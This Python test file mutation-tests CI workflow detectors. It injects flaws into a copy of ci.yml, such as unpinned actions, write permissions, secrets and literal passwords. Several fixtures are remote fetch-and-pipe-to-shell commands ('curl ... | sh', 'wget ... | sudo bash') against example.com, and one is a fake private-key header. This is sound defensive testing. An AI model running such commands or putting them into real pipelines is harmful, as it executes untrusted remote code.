"""Testes de mutação do workflow de CI (F0-03).

Cada mutação altera uma cópia do texto de ``ci.yml`` e reaplica os detectores de
``test_ci_static``; o detector responsável tem de falhar. Assim se prova que eles
não passam no vácuo. O controle sem mutação e a mutação inofensiva garantem que
também não rejeitam tudo.
"""

import json
import re
import shutil
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
import yaml

import test_ci_static as base

FAIL = (AssertionError, KeyError, StopIteration)
SHA = "a" * 40

Checker = Callable[[dict[Any, Any], str, Path], None]

CHECKS: dict[str, Checker] = {
    "triggers": lambda wf, raw, root: base.test_triggers(wf),
    "jobs_and_commands": lambda wf, raw, root: base.test_jobs_and_commands(wf),
    "python_matrix": lambda wf, raw, root: base.test_python_matrix(wf, root),
    "permissions": lambda wf, raw, root: base.test_permissions(wf),
    "timeouts": lambda wf, raw, root: base.test_timeouts_and_concurrency(wf),
    "actions": lambda wf, raw, root: base.test_actions_official_and_pinned(wf),
    "caches": lambda wf, raw, root: base.test_caches(wf, root),
    "secrets": lambda wf, raw, root: base.test_no_secrets_in_workflow(raw),
    "env": lambda wf, raw, root: base.test_workflow_env_has_no_literal_credentials(wf),
    "ultralytics": lambda wf, raw, root: base.test_no_ultralytics_in_workflow(raw),
    "critical_path": lambda wf, raw, root: base.test_smoke_off_critical_path(wf, raw),
    "node": lambda wf, raw, root: base.test_node_matches_engines(wf, root),
    "licencas": lambda wf, raw, root: base.test_licencas_lists_every_action(wf, root),
}

RUN_STEP = "      - run: {cmd}\n"


def _orig(repo_root: Path) -> str:
    return (repo_root / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")


def _apply(raw: str, old: str, new: str, count: int = 0) -> str:
    assert old in raw, f"mutação não aplicável: {old!r}"
    out = raw.replace(old, new) if count == 0 else raw.replace(old, new, count)
    assert out != raw
    return out


def _run(check: str, raw: str, root: Path) -> None:
    wf = yaml.safe_load(raw)
    assert isinstance(wf, dict)
    CHECKS[check](wf, raw, root)


def _append_step(raw: str, cmd: str) -> str:
    return raw.rstrip("\n") + "\n" + RUN_STEP.format(cmd=cmd)


def test_control_unmutated_passes_every_detector(repo_root: Path) -> None:
    raw = _orig(repo_root)
    for name in CHECKS:
        _run(name, raw, repo_root)


def test_harmless_sha_pin_is_accepted(repo_root: Path) -> None:
    raw = _apply(_orig(repo_root), "actions/checkout@v5", f"actions/checkout@{SHA}")
    _run("actions", raw, repo_root)


MUTATIONS: list[tuple[str, str, Callable[[str], str]]] = [
    ("checkout@main", "actions", lambda r: _apply(r, "checkout@v5", "checkout@main")),
    (
        "setup-python@master",
        "actions",
        lambda r: _apply(r, "setup-python@v6", "setup-python@master"),
    ),
    (
        "uses sem versão",
        "actions",
        lambda r: _apply(r, "actions/setup-node@v6", "actions/setup-node"),
    ),
    ("sha curto (39)", "actions", lambda r: _apply(r, "checkout@v5", f"checkout@{SHA[:39]}")),
    ("sha maiúsculo", "actions", lambda r: _apply(r, "checkout@v5", f"checkout@{'A' * 40}")),
    ("tag semver completa", "actions", lambda r: _apply(r, "checkout@v5", "checkout@v5.1.0")),
    (
        "action de terceiro",
        "actions",
        lambda r: _apply(r, "actions/setup-node@v6", "evil/setup-node@v6"),
    ),
    (
        "action local",
        "actions",
        lambda r: _apply(r, "actions/setup-node@v6", "./.github/actions/x"),
    ),
    ("action docker", "actions", lambda r: _apply(r, "actions/setup-node@v6", "docker://alpine:3")),
    (
        "checkout sem persist-credentials",
        "actions",
        lambda r: _apply(r, "persist-credentials: false", "persist-credentials: true", 1),
    ),
    (
        "checkout com persist-credentials ausente",
        "actions",
        lambda r: _apply(
            r,
            "        with:\n          persist-credentials: false\n"
            "      - uses: actions/setup-python",
            "      - uses: actions/setup-python",
            1,
        ),
    ),
    (
        "pull_request_target",
        "triggers",
        lambda r: _apply(r, "  pull_request:\n", "  pull_request_target:\n"),
    ),
    (
        "pull_request_target extra",
        "triggers",
        lambda r: _apply(
            r, "  workflow_dispatch:\n", "  workflow_dispatch:\n  pull_request_target:\n"
        ),
    ),
    ("pull_request_target no texto", "secrets", lambda r: r + "# pull_request_target\n"),
    ("sem workflow_dispatch", "triggers", lambda r: _apply(r, "  workflow_dispatch:\n", "")),
    (
        "push em branch extra",
        "triggers",
        lambda r: _apply(r, '      - "feat/**"\n', '      - "feat/**"\n      - "**"\n'),
    ),
    (
        "secrets. no env do step",
        "secrets",
        lambda r: _apply(
            r,
            "        run: make check",
            "        env:\n          X: ${{ secrets.FOO }}\n        run: make check",
        ),
    ),
    (
        "secrets.GITHUB_TOKEN",
        "secrets",
        lambda r: _apply(
            r,
            "        run: make check",
            "        env:\n          GH: ${{ secrets.GITHUB_TOKEN }}\n        run: make check",
        ),
    ),
    (
        "permissions write no topo",
        "permissions",
        lambda r: _apply(r, "  contents: read", "  contents: write", 1),
    ),
    (
        "permissions write-all",
        "permissions",
        lambda r: _apply(r, "permissions:\n  contents: read", "permissions: write-all"),
    ),
    (
        "permissions extra no topo",
        "permissions",
        lambda r: _apply(r, "  contents: read", "  contents: read\n  packages: read", 1),
    ),
    (
        "permissions ausente no topo",
        "permissions",
        lambda r: _apply(r, "permissions:\n  contents: read\n\n", ""),
    ),
    (
        "permissions write no job",
        "permissions",
        lambda r: _apply(
            r,
            "    timeout-minutes: 15\n",
            "    timeout-minutes: 15\n    permissions:\n      contents: write\n",
        ),
    ),
    (
        "id-token no job",
        "permissions",
        lambda r: _apply(
            r,
            "    timeout-minutes: 25\n",
            "    timeout-minutes: 25\n    permissions:\n      id-token: read\n",
        ),
    ),
    (
        "matriz com float 3.1",
        "python_matrix",
        lambda r: _apply(r, '["3.11", "3.12"]', '[3.10, "3.12"]'),
    ),
    (
        "matriz float 3.12 sem aspas",
        "python_matrix",
        lambda r: _apply(r, '["3.11", "3.12"]', '["3.11", 3.12]'),
    ),
    ("matriz sem 3.11", "python_matrix", lambda r: _apply(r, '["3.11", "3.12"]', '["3.12"]')),
    ("matriz sem 3.12", "python_matrix", lambda r: _apply(r, '["3.11", "3.12"]', '["3.11"]')),
    (
        "matriz com '3.10' string",
        "python_matrix",
        lambda r: _apply(r, '["3.11", "3.12"]', '["3.10", "3.11", "3.12"]'),
    ),
    (
        "python do smoke abaixo do mínimo",
        "python_matrix",
        lambda r: _apply(r, '          python-version: "3.12"', '          python-version: "3.9"'),
    ),
    (
        "python do smoke float",
        "python_matrix",
        lambda r: _apply(r, '          python-version: "3.12"', "          python-version: 3.12"),
    ),
    ("gate sem timeout", "timeouts", lambda r: _apply(r, "    timeout-minutes: 15\n", "")),
    ("smoke sem timeout", "timeouts", lambda r: _apply(r, "    timeout-minutes: 25\n", "")),
    ("timeout zero", "timeouts", lambda r: _apply(r, "timeout-minutes: 15", "timeout-minutes: 0")),
    (
        "timeout negativo",
        "timeouts",
        lambda r: _apply(r, "timeout-minutes: 15", "timeout-minutes: -5"),
    ),
    (
        "timeout string",
        "timeouts",
        lambda r: _apply(r, "timeout-minutes: 15", 'timeout-minutes: "15"'),
    ),
    (
        "timeout booleano",
        "timeouts",
        lambda r: _apply(r, "timeout-minutes: 15", "timeout-minutes: true"),
    ),
    (
        "timeout float",
        "timeouts",
        lambda r: _apply(r, "timeout-minutes: 15", "timeout-minutes: 15.5"),
    ),
    (
        "gate acima de 30",
        "timeouts",
        lambda r: _apply(r, "timeout-minutes: 15", "timeout-minutes: 31"),
    ),
    (
        "smoke acima de 45",
        "timeouts",
        lambda r: _apply(r, "timeout-minutes: 25", "timeout-minutes: 46"),
    ),
    (
        "sem concurrency",
        "timeouts",
        lambda r: _apply(
            r,
            "concurrency:\n  group: ci-${{ github.workflow }}-${{ github.ref }}\n"
            "  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}\n\n",
            "",
        ),
    ),
    (
        "cancel-in-progress false",
        "timeouts",
        lambda r: _apply(
            r,
            "cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}",
            "cancel-in-progress: false",
        ),
    ),
    (
        "cancel-in-progress true literal",
        "timeouts",
        lambda r: _apply(
            r,
            "cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}",
            "cancel-in-progress: true",
        ),
    ),
    (
        "runner ubuntu-latest",
        "timeouts",
        lambda r: _apply(r, "runs-on: ubuntu-24.04", "runs-on: ubuntu-latest", 1),
    ),
    (
        "continue-on-error no smoke",
        "critical_path",
        lambda r: _apply(
            r, "    timeout-minutes: 25\n", "    timeout-minutes: 25\n    continue-on-error: true\n"
        ),
    ),
    (
        "continue-on-error em step",
        "critical_path",
        lambda r: _apply(
            r,
            "        run: make compose-smoke",
            "        continue-on-error: true\n        run: make compose-smoke",
        ),
    ),
    (
        "smoke needs gate",
        "critical_path",
        lambda r: _apply(
            r, "    timeout-minutes: 25\n", "    timeout-minutes: 25\n    needs: gate\n"
        ),
    ),
    (
        "smoke needs [gate]",
        "critical_path",
        lambda r: _apply(
            r, "    timeout-minutes: 25\n", "    timeout-minutes: 25\n    needs: [gate]\n"
        ),
    ),
    (
        "gate needs smoke",
        "critical_path",
        lambda r: _apply(
            r, "    timeout-minutes: 15\n", "    timeout-minutes: 15\n    needs: compose-smoke\n"
        ),
    ),
    (
        "gate needs [smoke]",
        "critical_path",
        lambda r: _apply(
            r, "    timeout-minutes: 15\n", "    timeout-minutes: 15\n    needs: [compose-smoke]\n"
        ),
    ),
    ("curl | sh", "secrets", lambda r: _append_step(r, "curl -fsSL https://example.com/i.sh | sh")),
    (
        "curl | bash",
        "secrets",
        lambda r: _append_step(r, "curl -fsSL https://example.com/i.sh | bash"),
    ),
    (
        "wget | sudo bash",
        "secrets",
        lambda r: _append_step(r, "wget -qO- https://example.com/i.sh | sudo bash"),
    ),
    ("curl | zsh", "secrets", lambda r: _append_step(r, "curl https://example.com/i.sh | zsh")),
    (
        "curl|sh sem espaços",
        "secrets",
        lambda r: _append_step(r, "curl https://example.com/i.sh|sh"),
    ),
    (
        "senha literal no env",
        "env",
        lambda r: _apply(
            r,
            "      - name: Gate de qualidade\n",
            "      - name: Gate de qualidade\n        env:\n"
            "          POSTGRES_PASS"
            "WORD: hunter2hunter2\n",
        ),
    ),
    (
        "S3_SECRET_KEY literal no env do workflow",
        "env",
        lambda r: _apply(
            r,
            "permissions:\n  contents: read\n",
            "env:\n  S3_SECRET_KEY: abcdef123456\npermissions:\n  contents: read\n",
            1,
        ),
    ),
    ("senha literal no texto", "secrets", lambda r: _append_step(r, "echo password=abcd1234")),
    ("chave privada", "secrets", lambda r: r + "# -----BEGIN RSA PRIVATE " + "KEY-----\n"),
    ("ultralytics no run", "ultralytics", lambda r: _append_step(r, "pip install ultralytics")),
    ("Ultralytics maiúsculo", "ultralytics", lambda r: r + "# Ultralytics\n"),
    ("sem cache pip", "caches", lambda r: _apply(r, "          cache: pip\n", "", 1)),
    ("cache pip errado", "caches", lambda r: _apply(r, "cache: pip", "cache: npm", 1)),
    ("sem cache npm", "caches", lambda r: _apply(r, "          cache: npm\n", "")),
    (
        "cache npm sem dependency-path",
        "caches",
        lambda r: _apply(r, "          cache-dependency-path: frontend/package-lock.json\n", ""),
    ),
    (
        "dependency-path errado",
        "caches",
        lambda r: _apply(r, "frontend/package-lock.json", "frontend/inexistente.json"),
    ),
    (
        "node 18 abaixo de engines",
        "node",
        lambda r: _apply(r, 'node-version: "22"', 'node-version: "18"'),
    ),
    ("node int 16", "node", lambda r: _apply(r, 'node-version: "22"', "node-version: 16")),
    (
        "gate sem make check",
        "jobs_and_commands",
        lambda r: _apply(r, "run: make check", "run: make test"),
    ),
    (
        "make check mascarado",
        "jobs_and_commands",
        lambda r: _apply(r, "run: make check", "run: make check || true"),
    ),
    (
        "gate sem npm ci",
        "jobs_and_commands",
        lambda r: _apply(r, "run: npm ci", "run: npm install"),
    ),
    (
        "npm ci sem working-directory",
        "jobs_and_commands",
        lambda r: _apply(r, "        working-directory: frontend\n", ""),
    ),
    (
        "npm ci depois do make check",
        "jobs_and_commands",
        lambda r: (
            _apply(
                r,
                "      - name: Instalar dependências do frontend\n        run: npm ci\n"
                "        working-directory: frontend\n",
                "",
            )
            + "      - run: npm ci\n        working-directory: frontend\n"
        ),
    ),
    (
        "gate sem pip install",
        "jobs_and_commands",
        lambda r: _apply(
            r,
            '          pip install -e ".[dev]"\n      - name: Instalar dependências do frontend',
            "          true\n      - name: Instalar dependências do frontend",
        ),
    ),
    (
        "smoke sem make compose-smoke",
        "jobs_and_commands",
        lambda r: _apply(r, "run: make compose-smoke", "run: echo skip"),
    ),
    (
        "job smoke renomeado",
        "jobs_and_commands",
        lambda r: _apply(r, "  compose-smoke:\n", "  smoke:\n"),
    ),
]


@pytest.mark.parametrize(("label", "detector", "mutate"), MUTATIONS, ids=[m[0] for m in MUTATIONS])
def test_detector_rejects_mutation(
    label: str, detector: str, mutate: Callable[[str], str], repo_root: Path
) -> None:
    mutated = mutate(_orig(repo_root))
    with pytest.raises(FAIL):
        _run(detector, mutated, repo_root)


def _licencas_root(repo_root: Path, tmp_path: Path, transform: Callable[[str], str]) -> Path:
    (tmp_path / "docs").mkdir()
    text = (repo_root / "docs" / "licencas.md").read_text(encoding="utf-8")
    new = transform(text)
    assert new != text
    (tmp_path / "docs" / "licencas.md").write_text(new, encoding="utf-8")
    return tmp_path


@pytest.mark.parametrize(
    "action", ["actions/checkout", "actions/setup-python", "actions/setup-node"]
)
def test_licencas_detects_missing_action_row(action: str, repo_root: Path, tmp_path: Path) -> None:
    root = _licencas_root(
        repo_root,
        tmp_path,
        lambda t: "\n".join(ln for ln in t.splitlines() if not ln.startswith(f"| {action} ")),
    )
    with pytest.raises(FAIL):
        _run("licencas", _orig(repo_root), root)


def test_licencas_detects_missing_section(repo_root: Path, tmp_path: Path) -> None:
    root = _licencas_root(repo_root, tmp_path, lambda t: t.replace("## GitHub Actions", "## Outra"))
    with pytest.raises(FAIL):
        _run("licencas", _orig(repo_root), root)


def test_licencas_detects_unlisted_third_party_action(repo_root: Path, tmp_path: Path) -> None:
    raw = _apply(_orig(repo_root), "actions/setup-node@v6", "docker/setup-buildx-action@v3")
    with pytest.raises(FAIL):
        _run("licencas", raw, repo_root)


def test_licencas_detects_wrong_version_and_license(repo_root: Path, tmp_path: Path) -> None:
    raw = _apply(_orig(repo_root), "checkout@v5", "checkout@v9")
    with pytest.raises(FAIL):
        _run("licencas", raw, repo_root)
    root = _licencas_root(
        repo_root,
        tmp_path,
        lambda t: re.sub(r"(\| actions/checkout [^\n]*)MIT", r"\1GPL-3.0-only", t),
    )
    with pytest.raises(FAIL):
        _run("licencas", _orig(repo_root), root)


def test_github_dir_not_ignored_detects_ignore(repo_root: Path, tmp_path: Path) -> None:
    shutil.copy(repo_root / ".gitignore", tmp_path / ".gitignore")
    with (tmp_path / ".gitignore").open("a", encoding="utf-8") as f:
        f.write("\n.github/\n")
    with pytest.raises(AssertionError):
        base.test_github_dir_not_ignored(tmp_path)


def test_node_engines_detector_rejects_low_workflow_node(repo_root: Path, tmp_path: Path) -> None:
    """Com engines acima do Node do workflow, o detector tem de falhar de fato."""
    (tmp_path / "frontend").mkdir()
    pkg = json.loads((repo_root / "frontend" / "package.json").read_text(encoding="utf-8"))
    pkg["engines"]["node"] = ">=24"
    (tmp_path / "frontend" / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    with pytest.raises(FAIL):
        _run("node", _orig(repo_root), tmp_path)


def test_yaml_on_key_is_parsed_as_true(repo_root: Path) -> None:
    """Critério 1: PyYAML lê `on` como True; o helper tem de tratar isso."""
    wf = yaml.safe_load(_orig(repo_root))
    assert True in wf and "on" not in wf
    assert {"push", "pull_request"} <= base._triggers(wf).keys()


def test_workflow_is_invalid_yaml_is_detected(repo_root: Path) -> None:
    with pytest.raises(yaml.YAMLError):
        yaml.safe_load(_orig(repo_root) + "\n  : [unbalanced\n")


# Lacunas antes abertas do detector de `curl | sh` (critério 9), agora corrigidas.
def test_curl_pipe_sh_multiline_is_detected(repo_root: Path) -> None:
    raw = _append_step(
        _orig(repo_root), "|\n          curl -fsSL https://example.com/i.sh \\\n            | sh"
    )
    with pytest.raises(AssertionError):
        _run("secrets", raw, repo_root)


def test_curl_pipe_sudo_flags_bash_is_detected(repo_root: Path) -> None:
    raw = _append_step(_orig(repo_root), "curl -fsSL https://example.com/i.sh | sudo -E bash")
    with pytest.raises(AssertionError):
        _run("secrets", raw, repo_root)
